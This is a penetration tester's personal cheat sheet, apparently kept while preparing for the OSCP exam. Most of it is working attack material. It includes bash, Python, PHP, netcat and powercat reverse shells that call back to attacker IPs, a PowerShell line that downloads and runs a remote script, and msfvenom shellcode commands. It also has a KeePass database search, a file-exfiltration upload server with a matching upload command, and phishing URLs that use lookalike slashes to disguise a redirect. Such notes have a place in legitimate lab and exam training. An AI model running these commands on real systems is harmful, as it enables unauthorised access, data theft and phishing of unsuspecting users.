---
layout: blank
pagetitle: Miscellaneous Notes
---

[https://johnstawinski.com/2022/10/09/oscp-2023-study-guide-new-exam-format/](https://johnstawinski.com/2022/10/09/oscp-2023-study-guide-new-exam-format/) [Ippsec’s videos](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) - vital at the beginning - show a bunch of HTB walkthroughs
- [https://ippsec.rocks/?#](https://ippsec.rocks/?#) - search up video on a topic [HackTheBox Active Directory track](https://app.hackthebox.com/tracks/Active-Directory-101) [TJ Null’s list of OSCP-like HTB machines](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159)
- `for i in \$(seq 1 254); do nc -zv -w 1 {IP/24}.$i {port}; done`
    - We have nmap at home
    - For a more basic ping sweep:
        - `for /l %i in (1,1,254) do @ping {IP/24}.%i -w 1 -n 1`

RDP on kali: `xfreerdp3 /u:{username} /p:{password} /v:{IP} (optional)/d:{domain} (optional)/drive:shared,/home/kali/Downloads/`
- Dealing with powershell wrapping? Just put the entire output in a variable and do `${variable} | Out-GridView`

Fixing Memory Corruption Exploits
- If it needs to be compiled on windows, use mingw-w64
    - `sudo apt install mingw-w64`
    - `i686-w64-mingw32-gcc`
    - `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
    - if compilation errors arise, just search them up
        - `-lws2_32` can be used for undefined references to _imp
        - `-l` can be used for statically link local libraries
- Can update shellcode in exploits with new shellcode using msfvenom
- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f c`
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f c`
- Encoding shellcode for binary for buffer overflow: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw > shellcode.bin`

Seems the WP admin creds are no longer admin/test, but rather admin/password

Phishing with fake slashes: `https://github.com∕praetorian-inc∕noseyparker∕releases∕download∕v0.23.0∕secret-noseyparker-v0.23.0-aarch64-apple-darwin.tar.gz@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%79%63%38%78%61%66%74%32`

Another example: `https://www.amazon.com∕gp∕product∕B008A0GNA8pr=conplccinc=259d9f6c-ea4f-492b-a741-8ca016e53a70ts=abthh8sjiwjcbgqcpkynoq55p8khgag&dasin=B07774L6TT&plattr=mathplace=priceblockimp@%74%69%6E%79%75%72%6C%2E%63%6F%6D/%79%63%38%78%61%66%74%32?=96298722-d186-4e28-b5e9-2ca14f49d977`

Using SMTP with `swaks`
- To use an SMTP server, we need a user whose credentials we know on the domain `swaks --server {IP_with_SMTP} --body @{body_txt_file} -ap --from {user@domain} --to {target@domain} --auth-user {user@domain} --auth-password {password} --attach @{file_to_attach} --header "{header_text}"`

If error `no PostgreSQL user name specified in startup packet`, make sure to:
- add env variables:

```
export PGUSER=postgres
export PGDATABASE=postgres
```

Connecting to a device/switch from a mac using an ethernet cable:
- Make sure to manually set IP and interface via Network settings after connecting via USB

- `sudo apt install libpq-dev`
- `sudo apt-get install --reinstall postgresql-client`

Run powercat - `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220:8000/powercat.ps1');powercat -c 192.168.45.220 -p 4444 -e powershell`

Search for password database - `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

To copy an executable, use `iwr -uri http://{kali_IP}/winPEASx64.exe -Outfile winPEAS.exe` instead of curl

Linux reverse shells:
- `bash -i >& /dev/tcp/{IP}/4444 0>&1`
- `busybox nc 10.10.10.10 1234 -e sh` or `busybox nc 10.10.10.10 1234 -e /bin/sh`
- `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
- `<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.106/443 0>&1');?>`

Windows reverse shell
- Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
- `C:\Windows\Temp\nc.exe -e powershell.exe {kali_IP} 4444` Powershell reverse shell
- Can also just do it with powershell alone - [https://khaelkugler.com/scripts/powershell_revshell.py](https://khaelkugler.com/scripts/powershell_revshell.py)

Transfer files with xfreerdp3 - `xfreerdp3 /u:{u} /p:{p} /v:{IP} /drive:mydrive,{local_dir_path}`

Upgrading linux shell:

```
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
    
```

Alternatively:
- `script /dev/null -c bash`
  - Then background the existing shell with CTRL Z
- On kali: `stty raw -echo; fg` (to continue the process)
- Type `reset` then set the terminal type to `screen`

Mount a Windows vhd:
- `sudo apt install libguestfs-tools`
- `guestmount --add {vhd_file} --inspector --ro -v /mnt/{dir_to_mount_to}`
  - `-ro` is readonly

Exfiltrate files off of a Windows system `sudo python3 app.py` (if [updog](https://github.com/sc0tfree/updog) isn't available)

```python group:a
#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import os

class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Get the filename from the POST headers if provided
        filename = self.headers.get('filename', 'upload.bin')

        # Save the uploaded file
        with open(filename, 'wb') as f:
            f.write(post_data)

        # Send a response back to the client
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'File uploaded successfully')

if __name__ == "__main__":
    server_address = ('0.0.0.0', 8080)  # Use any port you want
    httpd = HTTPServer(server_address, FileUploadHTTPRequestHandler)
    print(f"Serving HTTP on {server_address[0]} port {server_address[1]} (http://{server_address[0]}:{server_address[1]}/)")
    httpd.serve_forever()
```
```python group:a
from http.server import SimpleHTTPRequestHandler, HTTPServer
import os
```

`Invoke-WebRequest -Uri "http://{kali_IP}:8080/upload" -Method Post -InFile "{filename}" -Headers @{"filename"="{filename}"} -UseBasicParsing`